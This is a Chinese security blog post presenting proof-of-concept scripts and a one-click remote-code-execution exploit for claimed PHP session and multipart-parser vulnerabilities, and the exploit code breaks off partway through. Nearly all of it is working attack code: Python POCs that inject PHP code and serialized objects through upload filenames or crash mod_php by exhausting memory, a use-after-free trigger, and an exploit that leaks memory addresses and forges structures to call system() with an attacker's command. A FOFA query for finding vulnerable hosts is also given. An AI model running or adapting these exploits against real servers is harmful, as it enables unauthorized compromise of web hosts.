#  【已复现】php2shell-POC and EXP 2026.22日  
原创 67626d
                    67626d  暗影安全   2026-10-21 16:36  
  
这是技术圈众所周知的一个事情，我不做过多的介绍。  
  
值得强调的是，不要相信临时修复方案，也不要相信waf可以帮你阻拦。你能选择的就是更新版本。  
  
搜索语法 / FOFA  
```
body="PHPSESSID"
```  
```
```  
  
影响资产数量：499,359 个（fofa 全网测绘，2026-10-22）  
  
  
一个检测的项目：  
```
https://github.com/ovtechnology/php2shell-check
```  
  
poc：  
verify_handler_mismatch.py  
  
```
CVE-2026-109618/109619 verification POCs
#!/usr/bin/env python3
"""
CVE-2026-109618/109619 — Verify session handler mismatch → object injection.
Demonstrates:
  1. Session written in php_serialize format (via directory with .user.ini)
  2. Pipe | in filename preserved in php_serialize format
  3. php handler reads the session → splits at | → deserializes injected object
  4. __destruct fires even when decode returns FAILURE (trailing data)
Setup required:
  - /app/ directory with .user.ini: session.serialize_handler = php_serialize
  - /api/ directory with .user.ini: session.serialize_handler = php
  - Both share the same session.save_path
Usage:
  python3 verify_handler_mismatch.py --target http://127.0.0.1:18080
For authorized security testing only.
"""
import argparse
import socket
import sys
from urllib.parse import urlparse
def upload(host, port, path, sid, filename):
    boundary = "MISMATCH"
    body = (
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="PHPSESSID"\r\n\r\n{sid}\r\n'
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\nx\r\n'
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="f"; filename="{filename}"\r\n\r\nZ\r\n'
        f"--{boundary}--\r\n"
    ).encode("latin-1")
    req = (
        f"POST {path} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"Content-Type: multipart/form-data; boundary={boundary}\r\n"
        f"Content-Length: {len(body)}\r\n"
        f"Connection: close\r\n\r\n"
    ).encode() + body
    s = socket.create_connection((host, port), timeout=15)
    s.sendall(req)
    s.settimeout(10)
    resp = b""
    while True:
        try:
            d = s.recv(65536)
            if not d:
                break
            resp += d
        except socket.timeout:
            break
    s.close()
    return resp
def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--target", default="http://127.0.0.1:18080")
    ap.add_argument("--write-path", default="/app/upload.php",
                    help="Endpoint with php_serialize handler")
    ap.add_argument("--read-path", default="/api/endpoint.php",
                    help="Endpoint with php handler")
    ap.add_argument("--sid", default="mismatchverify0000000000000")
    args = ap.parse_args()
    u = urlparse(args.target)
    host = u.hostname
    port = u.port or 80
    print("[*] CVE-2026-109618/109619 — Handler Mismatch Verification")
    print(f"[*] Target: {args.target}")
    print()
    # Step 1: Write session via php_serialize endpoint
    # Filename contains |O:8:"stdClass":0:{} (escaped quotes)
    gadget = 'x|O:8:\\"stdClass\\":0:{}'
    print(f"[1] Writing session via {args.write_path} (php_serialize)")
    print(f"    Filename payload: {gadget}")
    upload(host, port, args.write_path, args.sid, gadget)
    print("    → Session file written in php_serialize format")
    # Step 2: Trigger via php handler endpoint
    print(f"\n[2] Triggering mismatch via {args.read_path} (php handler)")
    print("    php handler scans for | → splits → deserializes O:8:\"stdClass\":0:{}")
    resp = upload(host, port, args.read_path, args.sid, "dummy")
    status = resp.split(b"\r\n", 1)[0].decode("latin1", "replace") if resp else "NO RESPONSE"
    print(f"    Response: {status}")
    print()
    print("[*] Verification indicators:")
    print("    - 'Failed to decode session object' warning = mismatch triggered")
    print("    - 'Session object destruction failed' = __destruct fired on injected object")
    print("    - If target has a class with exploitable __destruct → RCE")
    print()
    print("[*] Check target for:")
    print(f"    - Session file: /tmp/sessions/sess_{args.sid}")
    print("    - Evidence of __destruct execution (file writes, network connections, etc.)")
if __name__ == "__main__":
    main()
```  
  
  
poc：  
verify_oom_trigger.py  
```
#!/usr/bin/env python3
"""
CVE-2026-109618 — PHP OOM Corruption → RCE (Apache mod_php)
Zero preconditions: no LFI, no unserialize, no application code needed.
The multipart parser can be forced to OOM while request memory is in an
invalid/uninitialized state. longjmp() skips cleanup, and mod_php's
unconditional request shutdown reads/branches on the invalid memory.
Three OOM strategies (from the official advisory):
1. No Content-Length → bypasses post_max_size → unbounded body data
2. Unlimited headers per multipart part → memory amplification
3. Empty file controls with nested field names → array multiplication
This POC demonstrates strategy 
#2
 (header amplification) and 
#3
 (nested arrays).
Target: Apache mod_php (NOT php-fpm — FPM exits child on startup failure)
Tested: PHP 8.2.34 with Apache mod_php
For authorized security research only.
"""
import argparse
import socket
import sys
import time
def build_header_bomb(boundary, num_headers=5000, header_size=500):
    """Strategy 2: A single multipart part with thousands of headers.
    Each header line uses ~header_size bytes on the wire but PHP's internal
    representation (zend_string + HashTable bucket) uses more memory.
    Memory amplification: ~3-5x wire size."""
    part = f"--{boundary}\r\n"
    part += f'Content-Disposition: form-data; name="f"; filename="a"\r\n'
    for i in range(num_headers):
        # Custom headers — PHP stores them all
        part += f"X-Pad-{i}: {'A' * header_size}\r\n"
    part += "\r\n"  # end of headers
    part += "Z"     # minimal body
    part += f"\r\n--{boundary}--\r\n"
    return part.encode()
def build_nested_array_bomb(boundary, depth=8, width=20):
    """Strategy 3: Empty file controls with deeply nested field names.
    PHP creates nested arrays for names like a[b][c][d][e][f][g][h].
    N fields × depth levels × PHP array overhead = exponential memory use.
    Empty file controls don't count toward max_file_uploads."""
    parts = []
    for i in range(width):
        # Build nested name: f[0][1][2]...[depth]
        name = "f"
        for d in range(depth):
            name += f"[{d}]"
        name += f"[{i}]"
        # Empty file control — no actual file, but PHP still creates metadata
        part = f"--{boundary}\r\n"
        part += f'Content-Disposition: form-data; name="{name}"; filename=""\r\n'
        part += "Content-Type: application/octet-stream\r\n"
        part += "\r\n"  # empty body
        parts.append(part)
    body = "".join(parts) + f"--{boundary}--\r\n"
    return body.encode()
def build_no_content_length_bomb(boundary, chunk_size=8192, total_mb=128):
    """Strategy 1: No Content-Length header → bypasses post_max_size check.
    Send continuous multipart body data exceeding memory_limit."""
    header = (
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="data"\r\n'
        f"\r\n"
    ).encode()
    # This returns a generator for streaming
    def generate():
        yield header
        total = 0
        target = total_mb * 1024 * 1024
        chunk = b"A" * chunk_size
        while total < target:
            yield chunk
            total += chunk_size
        yield f"\r\n--{boundary}--\r\n".encode()
    return generate
def send_oom_request(host, port, path, strategy="headers", **kwargs):
    """Send the OOM-triggering multipart request."""
    boundary = "OOM_BOUNDARY_" + str(int(time.time()))
    if strategy == "headers":
        body = build_header_bomb(boundary,
                                num_headers=kwargs.get("num_headers", 5000),
                                header_size=kwargs.get("header_size", 500))
        content_length = len(body)
        req = (
            f"POST {path} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"Content-Type: multipart/form-data; boundary={boundary}\r\n"
            f"Content-Length: {content_length}\r\n"
            f"Connection: close\r\n"
            f"\r\n"
        ).encode() + body
        s = socket.create_connection((host, port), timeout=30)
        s.sendall(req)
    elif strategy == "nested":
        body = build_nested_array_bomb(boundary,
                                       depth=kwargs.get("depth", 10),
                                       width=kwargs.get("width", 1000))
        content_length = len(body)
        req = (
            f"POST {path} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"Content-Type: multipart/form-data; boundary={boundary}\r\n"
            f"Content-Length: {content_length}\r\n"
            f"Connection: close\r\n"
            f"\r\n"
        ).encode() + body
        s = socket.create_connection((host, port), timeout=30)
        s.sendall(req)
    elif strategy == "no_length":
        # No Content-Length — send streaming
        header = (
            f"POST {path} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"Content-Type: multipart/form-data; boundary={boundary}\r\n"
            f"Transfer-Encoding: chunked\r\n"
            f"Connection: close\r\n"
            f"\r\n"
        ).encode()
        s = socket.create_connection((host, port), timeout=60)
        s.sendall(header)
        gen = build_no_content_length_bomb(boundary,
                                           total_mb=kwargs.get("total_mb", 128))
        for chunk in gen():
            # Chunked encoding
            s.sendall(f"{len(chunk):x}\r\n".encode() + chunk + b"\r\n")
        s.sendall(b"0\r\n\r\n")
    # Read response
    s.settimeout(15)
    resp = b""
    while True:
        try:
            d = s.recv(65536)
            if not d:
                break
            resp += d
        except socket.timeout:
            break
    s.close()
    return resp
def main():
    ap = argparse.ArgumentParser(description="CVE-2026-109618 OOM Corruption POC")
    ap.add_argument("--host", default="127.0.0.1")
    ap.add_argument("--port", type=int, default=80)
    ap.add_argument("--path", default="/index.php")
    ap.add_argument("--strategy", choices=["headers", "nested", "no_length"], default="headers")
    ap.add_argument("--num-headers", type=int, default=5000)
    ap.add_argument("--header-size", type=int, default=500)
    ap.add_argument("--depth", type=int, default=10)
    ap.add_argument("--width", type=int, default=1000)
    ap.add_argument("--total-mb", type=int, default=128)
    args = ap.parse_args()
    print(f"CVE-2026-109618 — PHP OOM Corruption POC")
    print(f"Target: {args.host}:{args.port}{args.path}")
    print(f"Strategy: {args.strategy}")
    print()
    if args.strategy == "headers":
        print(f"Sending {args.num_headers} headers × {args.header_size} bytes each")
        wire_size = args.num_headers * (args.header_size + 20)
        mem_est = wire_size * 4  # ~4x amplification
        print(f"Wire size: ~{wire_size // 1024 // 1024}MB, Estimated PHP memory: ~{mem_est // 1024 // 1024}MB")
    elif args.strategy == "nested":
        print(f"Sending {args.width} empty file controls with {args.depth}-deep nesting")
    elif args.strategy == "no_length":
        print(f"Sending {args.total_mb}MB without Content-Length (bypasses post_max_size)")
    print()
    print("Sending...")
    resp = send_oom_request(args.host, args.port, args.path,
                            strategy=args.strategy,
                            num_headers=args.num_headers,
                            header_size=args.header_size,
                            depth=args.depth,
                            width=args.width,
                            total_mb=args.total_mb)
    if resp:
        status = resp.split(b"\r\n", 1)[0].decode("latin1", "replace")
        print(f"Response: {status}")
        print(f"Size: {len(resp)} bytes")
        if b"500" in status.encode():
            print("\n[+] Server returned 500 — OOM likely triggered!")
            print("    On Apache mod_php, the request shutdown procedure runs on invalid state.")
            print("    With heap shaping, this leads to RCE.")
        elif not resp or b"connection" in resp.lower():
            print("\n[+] Connection dropped — server process may have crashed!")
        else:
            print("\n[-] Server responded normally — OOM threshold not reached.")
            print("    Try increasing --num-headers or --header-size")
    else:
        print("\n[+] No response — server process likely crashed!")
        print("    This confirms the OOM bailout condition.")
if __name__ == "__main__":
    main()
```  
  
  
poc：  
verify_session_injection.py  
```
#!/usr/bin/env python3
"""
CVE-2026-109618/109619 — Verify session file injection via upload_progress filename.
Demonstrates:
  1. Session fixation via POST body PHPSESSID (bypasses use_only_cookies)
  2. Unvalidated filename stored raw in session file (can contain PHP code)
  3. Session file created with attacker-controlled content
Usage:
  python3 verify_session_injection.py --target http://127.0.0.1:18080
For authorized security testing only.
"""
import argparse
import socket
import sys
from urllib.parse import urlparse
def send_upload(host, port, path, sid, filename):
    boundary = "VERIFY"
    body = (
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="PHPSESSID"\r\n\r\n{sid}\r\n'
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\nx\r\n'
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="f"; filename="{filename}"\r\n\r\nZ\r\n'
        f"--{boundary}--\r\n"
    ).encode("latin-1")
    req = (
        f"POST {path} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"Content-Type: multipart/form-data; boundary={boundary}\r\n"
        f"Content-Length: {len(body)}\r\n"
        f"Cookie: PHPSESSID={sid}\r\n"
        f"Connection: close\r\n\r\n"
    ).encode() + body
    s = socket.create_connection((host, port), timeout=15)
    s.sendall(req)
    s.settimeout(10)
    resp = b""
    while True:
        try:
            d = s.recv(65536)
            if not d:
                break
            resp += d
        except socket.timeout:
            break
    s.close()
    return resp
def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--target", default="http://127.0.0.1:18080")
    ap.add_argument("--path", default="/index.php")
    ap.add_argument("--sid", default="verifysession00000000000000")
    args = ap.parse_args()
    u = urlparse(args.target)
    host = u.hostname
    port = u.port or 80
    print("[*] CVE-2026-109618/109619 — Session Injection Verification")
    print(f"[*] Target: {args.target}")
    print()
    # Test 1: Normal filename
    print("[1] Testing normal filename...")
    send_upload(host, port, args.path, args.sid + "a", "normal.txt")
    print("    → Session file should contain: s:10:\"normal.txt\"")
    # Test 2: PHP code in filename
    php_payload = "<?php system('id');echo 'RCE';?>"
    print(f"[2] Testing PHP code in filename: {php_payload}")
    send_upload(host, port, args.path, args.sid + "b", php_payload)
    print(f"    → Session file should contain PHP code as raw string")
    # Test 3: Pipe character in filename (for handler mismatch)
    pipe_payload = "x|O:8:\"stdClass\":0:{}"
    print(f"[3] Testing pipe + serialized object in filename")
    # Need \" escaping for Content-Disposition
    escaped = pipe_payload.replace('"', '\\"')
    send_upload(host, port, args.path, args.sid + "c", escaped)
    print(f"    → Session file should contain |O:8: in the filename field")
    print()
    print("[*] Verification complete. Check session files on the target:")
    print(f"    cat /tmp/sessions/sess_{args.sid}a")
    print(f"    cat /tmp/sessions/sess_{args.sid}b")
    print(f"    cat /tmp/sessions/sess_{args.sid}c")
    print()
    print("[*] Key indicators:")
    print("    - Session fixation: file created with attacker-controlled SID")
    print("    - Filename injection: raw PHP code / serialized objects in session data")
    print("    - No authentication required")
if __name__ == "__main__":
    main()
```  
  
  
verify_uaf_asan.php  
```
<?php
/**
 * CVE-2026-109618/109619 — var_destroy __destruct reentry UAF verification.
 *
 * Triggers ASAN heap-use-after-free in php_var_unserialize (var_unserializer.c:851).
 *
 * Run with: USE_ZEND_ALLOC=0 ASAN_OPTIONS="detect_leaks=0" php verify_uaf_asan.php
 *
 * Root cause: var_destroy() frees back-reference extension chunks (line 245),
 * then i_zval_ptr_dtor at line 310 fires __destruct WITHOUT BG(serialize_lock).
 * Inner unserialize('R:1500;') reuses the outer var_hash (freed entries) → UAF read.
 *
 * For authorized security testing only.
 */
class TriggerUAF {
    public function __destruct() {
        fwrite(STDERR, "[*] __destruct fired (serialize_lock=0, BG(unserialize).level>0)\n");
        fwrite(STDERR, "[*] Attempting R:1500 backref into freed var_hash extension chunk...\n");
        $result = @unserialize('R:1500;');
        $type = gettype($result);
        fwrite(STDERR, "[*] R:1500 resolved to: $type\n");
        if ($result !== false) {
            fwrite(STDERR, "[+] UAF CONFIRMED: R:1500 read from freed memory!\n");
        }
    }
}
// Build payload: 2000+ entries to overflow VAR_ENTRIES_MAX (1018)
// Then duplicate key to move TriggerUAF to dtor list
$N = 2000;
$payload = 'a:' . ($N + 2) . ':{';
for ($i = 0; $i < $N; $i++) {
    $payload .= "i:$i;i:$i;";
}
$payload .= 'i:99999;O:10:"TriggerUAF":0:{}';
$payload .= 'i:99999;i:42;';
$payload .= '}';
fwrite(STDERR, "[*] Payload: " . strlen($payload) . " bytes, $N entries + UAF trigger\n");
fwrite(STDERR, "[*] Firing unserialize()...\n");
@unserialize($payload);
fwrite(STDERR, "[*] Done. If ASAN reported heap-use-after-free, the UAF is confirmed.\n");
fwrite(STDERR, "[*] Expected ASAN trace:\n");
fwrite(STDERR, "    READ at php_var_unserialize (var_unserializer.c:851)\n");
fwrite(STDERR, "    freed at var_destroy (var_unserializer.c:245)\n");
```  
  
  
poc使用介绍：  
```
# 验证链A：会话注入 python3 verify_session_injection.py --target http://127.0.0.1:18080
# 验证链B：UAF（需要ASAN构建）USE_ZEND_ALLOC=0 ASAN_OPTIONS="detect_leaks=0" php verify_uaf_asan.php
# 验证链C：处理程序不匹配 python3 verify_handler_mismatch.py --target http://127.0.0.1:18080
# 验证链D：Apache mod_php python3内存溢出 verify_oom_trigger.py --host 127.0.0.1 --port 18081 --strategy header
```  
  
EXP：  
```
一条命令完成整个利用；首次运行会自动读取 libphp 偏移
python3 exploit.py -u http://127.0.0.1:8088/index.php
# PROOF: uid=33(www-data) gid=33(www-data) groups=33(www-data)
```  
```
#!/usr/bin/env python3
"""
php2shell - one-click remote exploit for PHP 8.4.26 / mod_php, prefork.
Default profile: official php:8.4.26-apache image (Apache 2.4.69).
Lab build (Apache 2.4.68, minimal PHP): use --profile lab.
Chain (all attacker traffic is plain HTTP):
  stage 0  HTTP worker rotation
  stage 1  Set-Cookie heap leak        -> Zend MM chunk base
  stage 2  Set-Cookie libphp leak      -> libphp base (ZVAL_PTR_DTOR)
  stage 3  upload_progress fake-ref    -> pDestructor = zif_system
Requirements on the target (the shipped docker/ setup matches these settings):
  display_errors=1, memory_limit=8M, max_input_vars=1000,
  session.use_cookies=1, session.use_strict_mode=0,
  session.upload_progress.enabled=1, single-worker prefork.
Usage:
  python3 exploit.py -u http://127.0.0.1:8088/index.php
  python3 exploit.py -u http://127.0.0.1:8088/index.php -c 'id>/out/p1' --proof-file out/p1
  python3 exploit.py -u http://127.0.0.1:8088/index.php -c 'id>/tmp/p1' --proof-file /tmp/p1
The command is embedded in a 167-byte live zend_string; the maximum command
length for this payload layout is 14 bytes.  For a longer command, chain it
through a short shell trigger, e.g. `sh</out/c` (8 bytes).
"""
from __future__ import annotations
import argparse
import os
import re
import socket
import ssl
import struct
import subprocess
import threading
import sys
import time
import urllib.parse
from collections import Counter
# Offsets for the lab build (PHP 8.4.26, Apache 2.4.68, Debian 12, gcc 12).
# They are relative to the libphp.so / Zend MM chunk base, so they do not
# depend on ASLR.  Rebuilds can shift them; pass --zif-offset/--dtor-offset.
ZIF_OFFSET = 0x43A870       # zif_system
DTOR_OFFSET = 0x613C50      # ZVAL_PTR_DTOR (zval_ptr_dtor)
HTDATA_OFFSET = 0x6E0D8     # live 167-byte string used as fake HashTable
MAX_CMD = 14                # 167-byte carrier - 0x98 header - NUL
# bookworm (official php:8.4.26-apache) calibration, measured on the image
BOOKWORM_STAGE1_N = 841
BOOKWORM_STAGE2_T = 406
BOOKWORM_STAGE2_V = 16
BOOKWORM_HTDATA_OFFSET = 0x690D8
BOOKWORM_STAGE3_PADS = [(31, 31)] * 6
SID = b"attacksessionid0001"
DEFAULT_CMD = "id>/out/p1"
_HERE = os.path.dirname(os.path.abspath(__file__))
DEFAULT_PROOF = os.path.join(_HERE, "out", "p1")
DEFAULT_OFFSETS = os.path.join(_HERE, "out", "offsets.env")
def build_multipart(parts, boundary: bytes) -> bytes:
    out = bytearray()
    for p in parts:
        name = p["name"].encode()
        out += b"--" + boundary + b"\r\n"
        out += b'Content-Disposition: form-data; name="' + name + b'"'
        if p.get("filename") is not None:
            out += b'; filename="' + p["filename"].encode() + b'"'
            out += b"\r\nContent-Type: application/octet-stream"
        out += b"\r\n\r\n" + p["data"] + b"\r\n"
    out += b"--" + boundary + b"--\r\n"
    return bytes(out)
def read_offsets_file(path: str) -> dict[str, int]:
    """Read ZIF_OFFSET=0x.. / DTOR_OFFSET=0x.. written by docker/offsets.py."""
    vals: dict[str, int] = {}
    if not path:
        return vals
    try:
        with open(path, "r", encoding="utf-8") as f:
            for line in f:
                line = line.strip()
                if not line or line.startswith("#") or "=" not in line:
                    continue
                key, val = line.split("=", 1)
                vals[key.strip()] = int(val.strip(), 0)
    except (OSError, ValueError):
        pass
    return vals
class Target:
    def __init__(self, url: str, timeout: float = 30.0, verbose: bool = True):
        u = urllib.parse.urlsplit(url)
        if u.scheme not in ("http", "https"):
            raise ValueError("URL must be http:// or https://")
        self.https = u.scheme == "https"
        self.host = u.hostname or "127.0.0.1"
        self.port = u.port or (443 if self.https else 80)
        self.path = u.path or "/"
        self.timeout = timeout
        self.verbose = verbose
    def log(self, msg: str) -> None:
        if self.verbose:
            print(msg, flush=True)
    def _connect(self):
        last = None
        for _ in range(10):
            try:
                s = socket.create_connection((self.host, self.port), timeout=self.timeout)
                if self.https:
                    ctx = ssl.create_default_context()
                    s = ctx.wrap_socket(s, server_hostname=self.host)
                try:
                    s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                except OSError:
                    pass
                return s
            except OSError as e:
                last = e
                time.sleep(0.3)
        raise last  # type: ignore[misc]
    def post(self, body: bytes, boundary: bytes, read_cap: int = 1 << 20,
             timeout: float | None = None,
             extra_headers: dict[str, str] | None = None) -> bytes:
        extra = ""
        for k, v in (extra_headers or {}).items():
            extra += f"{k}: {v}\r\n"
        hdr = (
            f"POST {self.path} HTTP/1.1\r\n"
            f"Host: {self.host}:{self.port}\r\n"
            f"{extra}"
            f"Content-Type: multipart/form-data; boundary={boundary.decode()}\r\n"
            f"Content-Length: {len(body)}\r\n"
            "Connection: close\r\n"
            "\r\n"
        ).encode()
        s = self._connect()
        s.settimeout(timeout or self.timeout)
        # Read concurrently with the upload: some exploit requests make the
        # worker abort right after sending Set-Cookie, and a recv() that starts
        # after the RST loses the already-buffered response.
        data = bytearray()
        def _reader() -> None:
            try:
                while len(data) < read_cap:
                    chunk = s.recv(65536)
                    if not chunk:
                        break
                    data.extend(chunk)
            except OSError:
                pass
        reader = threading.Thread(target=_reader, daemon=True)
        reader.start()
        try:
            try:
                s.sendall(hdr)
                mv = memoryview(body)
                for off in range(0, len(body), 262144):
                    s.sendall(mv[off:off + 262144])
            except OSError:
                pass  # the worker may abort while the body is still in flight
            reader.join(timeout=(timeout or self.timeout) + 1.0)
            return bytes(data)
        finally:
            s.close()
    def get(self, path: str, read_cap: int = 1 << 20) -> tuple[int, bytes]:
        hdr = (
            f"GET {path} HTTP/1.1\r\n"
            f"Host: {self.host}:{self.port}\r\n"
            "Connection: close\r\n"
            "\r\n"
        ).encode()
        s = self._connect()
        s.settimeout(self.timeout)
        try:
            s.sendall(hdr)
            data = bytearray()
            try:
                while len(data) < read_cap:
                    chunk = s.recv(65536)
                    if not chunk:
                        break
                    data += chunk
            except OSError:
                pass
        finally:
            s.close()
        head, _, body = bytes(data).partition(b"\r\n\r\n")
        m = re.match(rb"HTTP/1\.[01] (\d{3})", head)
        return (int(m.group(1)) if m else 0), body
def parse_cookie(resp: bytes) -> bytes:
    m = re.search(rb"Set-Cookie: PHPSESSID=([^\r\n]*?); path=/", resp)
    if not m:
        return b""
    return urllib.parse.unquote_to_bytes(m.group(1).decode("latin1"))
def chunk_base_from_cookie(raw: bytes) -> int:
    """Stage 1: 2MB-aligned mode of the heap pointers in the decoded cookie."""
    if len(raw) < 1000:
        return 0
    c: Counter[int] = Counter()
    for i in range(len(raw) - 8):
        v = int.from_bytes(raw[i:i + 8], "little")
        if 0x7F0000000000 <= v < 0x800000000000:
            c[v & ~0x1FFFFF] += 1
    if not c:
        return 0
    base, count = c.most_common(1)[0]
    return base if count >= 8 else 0
def libphp_base_from_cookie(raw: bytes, dtor_offset: int = DTOR_OFFSET) -> int:
    """Stage 2: Set-Cookie data starts at PS(id)+0x18 = nNextFreeElement|pDestructor.
    The page-aligned check is 4KB, not 2MB: the lab build happened to map
    libphp at a 2MB boundary, but the official php:8.4.26-apache image maps it
    at a 4KB boundary (e.g. base 0x...acdb000).
    """
    if len(raw) < 16:
        return 0
    p = int.from_bytes(raw[8:16], "little")
    if not (0x7F0000000000 <= p < 0x800000000000):
        return 0
    if p & 0xFFF != dtor_offset & 0xFFF:
        return 0
    base = p - dtor_offset
    return base if base & 0xFFF == 0 else 0
class Exploit:
    def __init__(self, target: Target, cmd: str, zif_offset: int = ZIF_OFFSET,
                 dtor_offset: int = DTOR_OFFSET, htdata_offset: int = HTDATA_OFFSET,
                 huge_mb: int = 12, verbose: bool = True, profile: str = "lab"):
        self.t = target
        self.cmd = cmd.encode()
        self.zif_offset = zif_offset
        self.dtor_offset = dtor_offset
        self.htdata_offset = htdata_offset
        self.huge_mb = huge_mb
        self.verbose = verbose
        self.profile = profile
        if profile == "bookworm":
            # official php:8.4.26-apache (Debian 12, Apache 2.4.69)
            self.stage1_n = BOOKWORM_STAGE1_N
            self.stage2_t = BOOKWORM_STAGE2_T
            self.stage2_v = BOOKWORM_STAGE2_V
            self.stage3_pads = list(BOOKWORM_STAGE3_PADS)
            self.stage3_carrier = True
        else:
            self.stage1_n = 892
            self.stage2_t = 443
            self.stage2_v = 1
            self.stage3_pads = [(8, 7)] + [(7, 7)] * 5
            self.stage3_carrier = False
    # ---------- request primitives (shapes match tools/*.py) ----------
    def _big_field(self) -> dict:
        return {"name": "big", "data": b"B" * (self.huge_mb * 1024 * 1024)}
    def _file_part(self) -> dict:
        return {"name": "f", "filename": "a.txt", "data": b"A" * 64}
    def rotate(self) -> None:
        """Abort the current worker over HTTP; prefork forks a fresh one."""
        self.t.log("[*] rotating worker over HTTP")
        parts = [{"name": f"f{i:04d}"[:5], "data": b"V" * 3000} for i in range(1001)]
        parts += [
            {"name": "PHPSESSID", "data": b"\x00"},
            {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
            self._file_part(),
            self._big_field(),
        ]
        self.t.post(build_multipart(parts, b"S" * 17), b"S" * 17,
                    read_cap=1 << 20, timeout=max(90.0, self.t.timeout))
        time.sleep(0.3)
        # Session-initializing B with no file part: pre-RINIT cleanup walks the
        # corrupted heap and the child aborts.
        parts = [
            {"name": "PHPSESSID", "data": SID},
            {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
        ]
        self.t.post(build_multipart(parts, b"BNDRY12345"), b"BNDRY12345",
                    read_cap=65536, timeout=20.0)
        time.sleep(0.5)
    def stage1(self) -> int:
        """Leak the Zend MM chunk base."""
        parts = [{"name": f"p{i:04d}", "data": b"x"} for i in range(1001)]
        parts += [
            {"name": "PHPSESSID", "data": b"\x00"},
            {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
            self._file_part(),
            self._big_field(),
        ]
        self.t.post(build_multipart(parts, b"S" * 17), b"S" * 17,
                    read_cap=1 << 20, timeout=max(90.0, self.t.timeout))
        time.sleep(0.2)
        parts = [
            {"name": "PHPSESSID", "data": SID},
            {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
        ]
        for i in range(self.stage1_n):
            val = (f"v{i:04d}" + "x" * 44)[:48]
            parts.append({"name": str(1000 + i), "data": val.encode()})
        forge = bytearray(b"A" * 79)
        struct.pack_into("<Q", forge, 0x10, 0x1000)   # forged zend_string len
        forge[0x18] = ord("L")
        parts.append({"name": "1999", "data": bytes(forge)})
        resp = self.t.post(build_multipart(parts, b"B" * 10), b"B" * 10,
                           read_cap=9 << 20)
        return chunk_base_from_cookie(parse_cookie(resp))
    def stage2(self) -> int:
        """Leak libphp base through a 56-byte HashTable page."""
        parts = [{"name": f"f{i:04d}"[:5], "data": b"x" * 39} for i in range(1001)]
        parts += [
            {"name": "PHPSESSID", "data": b"\x00"},
            {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
            self._file_part(),
            self._big_field(),
        ]
        self.t.post(build_multipart(parts, b"S" * 17), b"S" * 17,
                    read_cap=1 << 20, timeout=max(90.0, self.t.timeout))
        time.sleep(0.2)
        parts = [
            {"name": "PHPSESSID", "data": SID},
            {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
        ]
        for i in range(983):
            cnt = 16 if i == self.stage2_t else 1
            for j in range(cnt):
                parts.append({"name": f"a{i:04d}[{j}]", "data": b"x" * self.stage2_v})
        resp = self.t.post(build_multipart(parts, b"B" * 10), b"B" * 10,
                           read_cap=1 << 20)
        return libphp_base_from_cookie(parse_cookie(resp), self.dtor_offset)
    def _fake_payload(self, htdata: int, zif: int) -> tuple[bytes, bytes]:
        cmd = self.cmd
        if len(cmd) > MAX_CMD:
            raise ValueError(
                f"command is {len(cmd)} bytes; the 167-byte carrier allows at most "
                f"{MAX_CMD} (e.g. use 'sh</out/c')"
            )
        ht = bytearray(b"\x00" * 167)
        # fake HashTable
        struct.pack_into("<II", ht, 0x00, 1, 7)                 # gc: rc=1, IS_ARRAY
        struct.pack_into("<II", ht, 0x08, 0x10, 0xFFFFFFF8)     # flags, nTableMask
        struct.pack_into("<Q", ht, 0x10, htdata + 0x20)         # arData
        struct.pack_into("<II", ht, 0x18, 1, 1)                 # nNumUsed/OfElements
        struct.pack_into("<II", ht, 0x20, 8, 0)                 # nTableSize/pointer
        struct.pack_into("<Q", ht, 0x28, 0)                     # nNextFreeElement
        struct.pack_into("<Q", ht, 0x30, zif)                   # pDestructor
        # fake execute_data at E = data+0x20
        E = 0x20
        struct.pack_into("<Q", ht, E + 0x00, 0)                 # opline
        struct.pack_into("<Q", ht, E + 0x08, 0)                 # call
        struct.pack_into("<Q", ht, E + 0x10, zif)               # return_value
        struct.pack_into("<Q", ht, E + 0x18, 0)                 # func
        struct.pack_into("<Q", ht, E + 0x20, 0)                 # This.value
        struct.pack_into("<I", ht, E + 0x28, 0)                 # This.u1.type_info
        struct.pack_into("<I", ht, E + 0x2C, 1)                 # num_args = 1
        struct.pack_into("<Q", ht, E + 0x30, 0)                 # prev_execute_data
        struct.pack_into("<Q", ht, E + 0x38, 0)                 # symbol_table
        struct.pack_into("<I", ht, E + 0x40, 0)                 # call_info
        struct.pack_into("<Q", ht, E + 0x50, htdata + 0x80)     # arg1 value
        struct.pack_into("<I", ht, E + 0x58, 6)                 # arg1 IS_STRING
        # fake zend_string at data+0x80
        struct.pack_into("<II", ht, 0x80, 1, 0x106)             # gc rc=1, IS_STRING
        struct.pack_into("<Q", ht, 0x88, 0)                     # h
        struct.pack_into("<Q", ht, 0x90, len(cmd))              # len
        ht[0x98:0x98 + len(cmd)] = cmd
        ht[0x98 + len(cmd)] = 0
        # fake reference (55 bytes) placed at R0-0x10
        ref = bytearray(b"X" * 55)
        struct.pack_into("<II", ref, 0x10, 1, 10)               # IS_REFERENCE
        struct.pack_into("<Q", ref, 0x18, htdata)               # val.value
        struct.pack_into("<Q", ref, 0x20, 0x307)                # IS_ARRAY_EX
        struct.pack_into("<Q", ref, 0x28, 0)                    # sources
        return bytes(ht), bytes(ref)
    def stage3(self, htdata: int, zif: int) -> None:
